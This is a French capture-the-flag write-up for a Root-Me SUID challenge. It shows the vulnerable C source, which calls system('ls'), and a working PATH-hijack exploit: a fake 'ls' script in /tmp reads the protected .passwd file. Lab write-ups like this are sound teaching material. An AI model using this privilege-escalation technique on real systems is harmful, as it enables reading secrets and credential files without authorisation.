# Exercice 3 — Bash — Système 2

## Contexte

- Protocole : SSH
- Port : `2222`
- Hôte : `challenge02.root-me.org`
- Utilisateur : `app-script-ch12`
- Mot de passe : `app-script-ch12`

```bash
ssh -p 2222 app-script-ch12@challenge02.root-me.org
```

## Code source

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

## Objectif

Lire le contenu du fichier secret `/challenge/app-script/ch12/.passwd`.

## Analyse

Comme dans le cas précédent, le programme utilise `setreuid` puis appelle `system()`. Cela permet d'exécuter une commande en tant qu'utilisateur propriétaire du binaire si le bit SUID est actif.

## Piste de résolution

Le concept est identique à l'exercice précédent : remplacer la commande `ls` dans `PATH` par un script personnalisé pour afficher le contenu attendu.

```bash
cd /tmp
cat > ls <<'EOF'
#!/bin/sh
cat /challenge/app-script/ch12/.passwd
EOF
chmod +x ls
export PATH=/tmp:$PATH
/challenge/app-script/ch12/ch12
```

## Explication

Le point clé est que `system()` invoque un shell, et ce shell résout chaque commande avec la variable `PATH`. En injectant un `ls` malicieux au début de `PATH`, on remplace la commande standard par une version qui affiche le secret.
